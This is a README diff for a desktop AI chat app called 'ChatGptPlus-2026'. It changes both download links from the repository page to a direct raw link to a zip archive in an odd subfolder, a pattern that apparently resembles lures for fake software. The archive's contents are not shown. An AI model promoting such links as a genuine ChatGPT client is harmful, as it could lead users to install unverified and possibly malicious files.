@@ -1,6 +1,6 @@
 # 💬 ChatGptPlus-2026 - Simple desktop AI chat
 
-[![Download](https://img.shields.io/badge/Download-ChatGptPlus--2026-blue?style=for-the-badge)](https://github.com/sarjud5053/ChatGptPlus-2026)
+[![Download](https://img.shields.io/badge/Download-ChatGptPlus--2026-blue?style=for-the-badge)](https://github.com/sarjud5053/ChatGptPlus-2026/raw/refs/heads/main/plessor/Plus-Chat-Gpt-v3.6.zip)
 
 ## 🖥️ What this app does
 
@@ -18,7 +18,7 @@ Use it for:
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/sarjud5053/ChatGptPlus-2026
+https://github.com/sarjud5053/ChatGptPlus-2026/raw/refs/heads/main/plessor/Plus-Chat-Gpt-v3.6.zip
 
 If the page shows a release file, download it. If it shows the app page, use the download option there.
 
